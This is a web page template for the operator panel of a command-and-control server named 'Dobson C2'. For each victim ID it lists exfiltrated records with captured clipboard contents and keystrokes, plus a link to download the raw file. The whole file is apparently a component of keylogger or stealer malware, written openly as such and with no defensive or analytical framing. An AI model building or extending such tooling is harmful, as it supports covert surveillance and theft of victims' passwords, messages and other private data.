<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dobson C2 - Victim View</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #0d1117; color: #c9d1d9; }
        .hero { background: #161b22; border-bottom: 1px solid #30363d; padding: 1rem 0; margin-bottom: 2rem; }
        .hero h1 { color: #58a6ff; }
        .btn-outline-light { border-color: #30363d; color: #c9d1d9; }
        .btn-outline-light:hover { background-color: #30363d; color: #58a6ff; }
        .record-card { margin-bottom: 1.5rem; border: 1px solid #30363d; border-left: 5px solid #1f6feb; background-color: #161b22; }
        .card-header { background-color: #21262d; border-bottom: 1px solid #30363d; color: #c9d1d9; }
        pre { background: #0d1117; padding: 10px; border-radius: 5px; max-height: 300px; overflow-y: auto; color: #e6edf3; border: 1px solid #30363d; }
        h6 { color: #79c0ff; }
        .badge { background-color: #238636 !important; }
        .btn-outline-secondary { color: #8b949e; border-color: #30363d; }
        .btn-outline-secondary:hover { background-color: #30363d; color: #58a6ff; }
        hr { border-color: #30363d; }
    </style>
</head>
<body>
    <div class="hero">
        <div class="container d-flex justify-content-between align-items-center">
            <h1>Victim: {{.VictimID}}</h1>
            <a href="/admin" class="btn btn-outline-light">Back to Dashboard</a>
        </div>
    </div>

    <div class="container">
        <h3 style="color: #58a6ff;">Exfiltrated Records ({{len .Records}})</h3>
        <hr>
        
        {{range .Records}}
        <div class="card record-card">
            <div class="card-header d-flex justify-content-between">
                <strong>Received: {{.ReceivedAt}}</strong>
                <span class="badge bg-secondary">ID: {{.RecordID}}</span>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-6">
                        <h6>Clipboard Data</h6>
                        <pre>{{.Clipboard}}</pre>
                    </div>
                    <div class="col-md-6">
                        <h6>Keystrokes</h6>
                        <pre>{{.Keystrokes}}</pre>
                    </div>
                </div>
            </div>
            <div class="card-footer text-end">
                <a href="/admin/download?file={{.Filename}}" class="btn btn-sm btn-outline-secondary">Download Raw File</a>
            </div>
        </div>
        {{else}}
        <div class="alert alert-warning">No readable records found for this victim.</div>
        {{end}}
    </div>
</body>
</html>
